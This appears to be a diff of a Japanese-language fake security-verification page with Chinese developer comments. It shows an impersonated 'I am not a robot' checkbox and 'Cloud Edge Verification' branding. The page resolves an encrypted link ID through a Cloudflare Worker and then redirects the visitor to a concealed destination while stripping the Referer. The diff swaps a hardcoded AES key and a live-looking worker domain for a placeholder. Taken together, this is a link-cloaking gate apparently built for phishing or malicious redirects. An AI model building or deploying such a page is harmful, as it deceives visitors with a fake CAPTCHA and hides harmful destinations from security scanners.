@@ -23,53 +23,30 @@
 </head>
 <body>
   <div class="card">
-    <p id="step">アクセスの安全性を確認しています。しばらくお待ちください。</p>
+    <h1>セキュリティ確認中...</h1>
+    <p id="step">リンクを検証しています。しばらくお待ちください。</p>
     <div class="loader" id="loader"></div>
 
     <div id="verify" style="display:none;">
-      <label><input type="checkbox" id="chk" />人間であることを確認します</label>
+      <label><input type="checkbox" id="chk" />私はロボットではありません</label>
       <button id="goBtn" disabled>続行</button>
       <div class="msg" id="ok">✅ 検証に成功しました。リダイレクト中...</div>
       <p class="err" id="err" style="display:none;"></p>
     </div>
 
-    <small>セキュリティ認証サービス</small>
+    <small>Cloud Edge Verification</small>
   </div>
 
   <script>
-    // ===== 配置 =====
-    const AES_KEY = "5Ctianyoumabiiii"; // 必须与 Worker 一致
+    // 你的 Worker 域名（可放多个做轮询）
     const WORKER_APIS = [
-      "https://9roj-0ctzkb.geebabymusic.workers.dev/",   // ← 改为你的Workers域（可放多个做轮询）
-      // "https://api-2.example.com",
+      "https://YOUR-WORKER-DOMAIN.workers.dev"   // ← 改成你的
+      // "https://api-2.example.com"
     ];
 
-    // ===== 工具 =====
-    const b64uToBytes = (b64u) => {
-      const b64 = b64u.replace(/-/g, '+').replace(/_/g, '/');
-      const pad = b64.length % 4 === 2 ? '==' : (b64.length % 4 === 3 ? '=' : '');
-      const bin = atob(b64 + pad);
-      return Uint8Array.from(bin, c => c.charCodeAt(0));
-    };
-    async function decryptAES(encB64u) {
-      const bytes = b64uToBytes(encB64u);
-      const iv = bytes.slice(0,16);
-      const data = bytes.slice(16);
-      const key = await crypto.subtle.importKey(
-        "raw",
-        new TextEncoder().encode(AES_KEY),
-        { name: "AES-CBC" },
-        false,
-        ["decrypt"]
-      );
-      const pt = await crypto.subtle.decrypt({ name:"AES-CBC", iv }, key, data);
-      return new TextDecoder().decode(pt).replace(/\u0000+$/,'');
-    }
-
-    // ===== 主流程 =====
     (async () => {
-      const loader = document.getElementById('loader');
       const step = document.getElementById('step');
+      const loader = document.getElementById('loader');
       const verifyBox = document.getElementById('verify');
       const chk = document.getElementById('chk');
       const goBtn = document.getElementById('goBtn');
@@ -78,38 +55,43 @@
 
       loader.style.display = 'block';
 
-      // 取 fragment 中的 明文ID（如 #MnyrelZH）
-      const id = (location.hash || '').replace(/^#/, '').trim();
-      if (!id) {
+      // 取 fragment：这是“加密ID”，不是明文
+      const encId = (location.hash || '').replace(/^#/, '').trim();
+      if (!encId) {
         loader.style.display = 'none';
         step.innerText = '無効なリンクです。';
         return;
       }
 
-      // 轮询 Worker API
-      let enc = null;
+      // 向 Worker 请求解析
+      let target = null;
       let lastError = null;
       for (const base of WORKER_APIS) {
         try {
-          const r = await fetch(`${base}/get_url?id=` + encodeURIComponent(id), { method: 'GET' });
+          const r = await fetch(`${base}/resolve?enc=${encodeURIComponent(encId)}`, { method: 'GET' });
           const j = await r.json();
-          if (j && j.enc) { enc = j.enc; break; }
-          lastError = j?.error || ('HTTP '+r.status);
+          if (j && j.url) { target = j.url; break; }       // 选项A：后端直接返回明文URL
+          if (j && j.enc) {                                // 选项B：后端返回 enc，再前端解密（本页未包含密钥，通常不走这支）
+            lastError = "client no key to decrypt enc url";
+          } else {
+            lastError = j?.error || ('HTTP '+r.status);
+          }
         } catch(e) {
           lastError = e.message;
         }
       }
 
-      if (!enc) {
+      if (!target) {
         loader.style.display = 'none';
-        step.innerText = 'ページを読み込めませんでした。しばらくしてからもう一度お試しください。';
+        step.innerText = 'リンクの検証に失敗しました。';
         err.style.display = 'block';
         err.innerText = 'エラー: ' + (lastError || 'unknown');
         return;
       }
 
+      // 显示验证
       loader.style.display = 'none';
-      step.innerText = 'あなたが人間であることを知らせてください';
+      step.innerText = '手動確認が必要です。チェックを入れて続行してください。';
       verifyBox.style.display = 'block';
 
       chk.addEventListener('change', () => {
@@ -125,19 +107,13 @@
       goBtn.addEventListener('click', async () => {
         goBtn.disabled = true;
         ok.style.display = 'block';
-        try {
-          const target = await decryptAES(enc);
-          // 保护 Referer（尽量）：用 a.click()
-          const a = document.createElement('a');
-          a.href = target;
-          a.rel = 'noreferrer noopener';
-          document.body.appendChild(a);
-          a.click();
-        } catch(e) {
-          ok.style.display = 'none';
-          err.style.display = 'block';
-          err.innerText = '復号エラー: ' + e.message;
-        }
+
+        // 尽量隐匿 Referer
+        const a = document.createElement('a');
+        a.href = target;
+        a.rel = 'noreferrer noopener';
+        document.body.appendChild(a);
+        a.click();
       });
     })();
   </script>
